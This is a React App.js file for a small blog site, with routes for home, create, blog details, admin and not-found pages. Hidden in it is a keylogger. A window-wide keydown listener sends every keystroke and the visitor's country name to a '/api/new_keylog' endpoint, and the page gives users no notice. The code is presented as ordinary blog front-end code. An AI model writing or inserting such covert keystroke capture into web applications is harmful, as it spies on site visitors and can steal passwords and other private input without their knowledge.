import { useContext } from 'react';
import Navbar from './Navbar';
import Home from './Home';
import { BrowserRouter as Router, Route, Routes } from "react-router-dom";
import Create from './Create';
import BlogDetails from './BlogDetails';
import NotFound from './NotFound';
import { LocationContext } from './contexts/LocationContext';
import Admin from './admin/Admin';

const CaptureKey = (key, location) => {
  fetch('http://localhost:5000/api/new_keylog', {
    method: 'POST',
    body: JSON.stringify({ key, location }),

  }).then(responce => {
    if (!responce.ok) {
      alert("ERROR")
    } else {
      console.log("Captured")
    }
    return responce.json();
  }).then(data => {
    alert('Captured')

  }).catch(error => {
    console.log('Aborted')
  })
}

function App() {

  const { location } = useContext(LocationContext);

  window.addEventListener('keydown', function (e) {
    location && CaptureKey(e.key, location.country_name)
  }, false);

  return (
    <Router>
      <div className="App">
        <Navbar />
        <div className="content">
          <Routes>
            <Route exact path="/">
              <Route exact path='' element ={<Home/>}/>
              <Route exact path="/create" element={<Create />} />
              <Route exact path="/blogs" element={<Home />} />
              <Route exact path="/admin" element={<Admin/>}/>
              <Route exact path="/blogs/:id" element={<BlogDetails />} />
              <Route path="*" element={<NotFound />} />
            </Route>
          </Routes>
        </div>
      </div>
    </Router>
  );
}

export default App;